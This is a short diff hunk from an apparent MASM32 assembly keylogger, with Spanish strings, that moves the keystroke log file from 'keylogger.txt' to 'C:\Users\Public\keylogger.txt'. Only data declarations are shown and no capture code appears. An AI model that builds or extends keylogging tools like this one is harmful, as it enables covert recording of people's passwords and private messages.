@@ -15,7 +15,7 @@ includelib \masm32\lib\user32.lib
 
 ;data segment
 .data
-	directorio byte "keylogger.txt",NULL
+	directorio byte "C:\Users\Public\keylogger.txt",NULL
 	error1 db "No se pudo crear el archivo",0
 
 	formatofecha db " dd/MM/yyyy ",0
